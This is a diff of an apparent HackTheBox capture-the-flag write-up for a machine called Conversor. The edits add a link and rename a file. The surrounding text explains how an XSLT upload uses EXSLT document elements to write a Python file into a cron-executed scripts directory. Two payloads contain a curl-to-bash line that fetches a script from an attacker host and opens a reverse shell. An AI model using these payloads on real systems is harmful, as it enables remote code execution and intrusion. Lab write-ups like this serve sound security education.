@@ -203,7 +203,7 @@ If you want to run Python scripts (for example, our server deletes all files old
 ***** www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f" ""
 ```
 
-This is our way in. The file tells us that its executing a **cron job**. Its specifying that it runs as `www-data`, executing any `.py` file within the `/var/www/conversor.htb/scripts/` directory on the server, particularily every 60 seconds.
+This is our way in. The file tells us that its executing a **cron job**. Read more here: [Cron Kubernetes](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/). Its specifying that it runs as `www-data`, executing any `.py` file within the `/var/www/conversor.htb/scripts/` directory on the server, particularily every 60 seconds.
 
 We use this to our advantage. Since the user portal allows us to upload `.xml` and `.xlst` files, executing them respectfully thanks to the parsing error, we can find a way to RCE a python file to the `/scripts` directory and maintain a reverse shell.
 
@@ -222,7 +222,7 @@ In order to make it the most effecient we combine processes into one singular up
     extension-element-prefixes="shell">
 
     <xsl:template match="/">
-        <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+        <shell:document href="/var/www/conversor.htb/scripts/Rshell.py" method="text">
 import os
 os.system("curl http://<your attacker ip>:8000/<directory your .sh file is in> | bash")
         </shell:document>
@@ -237,7 +237,7 @@ This version of EXSLT supports 2 seperate namespaces of exporting text to an upl
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
   <xsl:template match="/">
-    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+    <exsl:document href="/var/www/conversor.htb/scripts/Rshell.py" method="text">
         <xsl:text>
         import os
         os.system("curl http://<your attacker ip>:8000/<directory your .sh file is in> | bash")
